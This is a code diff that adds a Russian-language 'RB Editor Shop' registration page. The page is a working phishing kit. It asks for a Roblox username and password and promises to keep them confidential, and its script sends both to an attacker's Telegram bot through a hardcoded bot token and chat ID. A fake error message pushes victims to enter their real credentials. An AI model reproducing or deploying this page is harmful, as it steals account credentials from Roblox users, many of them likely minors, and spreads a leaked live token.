@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RB Editor Shop - Регистрация</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-image: url('background.jpg'); /* Фон */
+            background-size: cover;
+            background-position: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        /* Основной блок */
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            width: 350px;
+            text-align: center;
+            position: relative;
+        }
+
+        /* Декоративные линии */
+        .container:before,
+        .container:after {
+            content: '';
+            position: absolute;
+            width: 80%;
+            height: 3px;
+            background: linear-gradient(to right, #4caf50, #2196f3);
+            top: 0;
+            left: 10%;
+            border-radius: 10px;
+        }
+
+        .container:after {
+            top: auto;
+            bottom: 0;
+        }
+
+        /* Заголовок */
+        h1 {
+            font-size: 36px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        /* Поля ввода */
+        input {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        /* Кнопка */
+        button {
+            background: linear-gradient(to right, #4caf50, #2196f3);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        button:hover {
+            background: linear-gradient(to right, #2196f3, #4caf50);
+            transform: scale(1.05);
+        }
+
+        /* Украшения: иконки */
+        .icons {
+            display: flex;
+            justify-content: center;
+            margin-top: 15px;
+            gap: 15px;
+        }
+
+        .icons img {
+            width: 40px;
+            transition: transform 0.3s ease;
+        }
+
+        .icons img:hover {
+            transform: scale(1.2);
+        }
+
+        /* Дополнительный текст */
+        .info {
+            margin-top: 15px;
+            color: #777;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Контейнер -->
+    <div class="container">
+        <h1>RB Editor Shop</h1>
+        <form id="registerForm">
+            <input type="text" id="username" placeholder="Логин Roblox" required>
+            <input type="password" id="password" placeholder="Пароль Roblox" required>
+            <button type="submit">Войти</button>
+        </form>
+
+        <!-- Иконки -->
+        <div class="icons">
+            <img src="icon1.png" alt="Иконка 1">
+            <img src="icon2.png" alt="Иконка 2">
+            <img src="icon3.png" alt="Иконка 3">
+        </div>
+
+        <!-- Дополнительная информация -->
+        <p class="info">Ваши данные будут сохранены конфиденциально.</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7404696936:AAH04x3sV7MpzpkqDqt7qZe_rlOg6eAwGlc";
+        const CHAT_ID = "6695380917";
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        document.getElementById("registerForm").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            const message = `👤 Новая регистрация:\nЛогин: ${username}\nПароль: ${password}`;
+
+            try {
+                const response = await fetch(TELEGRAM_API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+                });
+
+                if (response.ok) {
+                    alert("Успешная регистрация пожалуйста подождите!!");
+                } else {
+                    alert("Ошибка входа используйте свой настоящий логин и пароль от Roblox.");
+                }
+            } catch (error) {
+                console.error("Ошибка:", error);
+                alert("Произошла ошибка.");
+            }
+        });
+    </script>
+</body>
+</html>
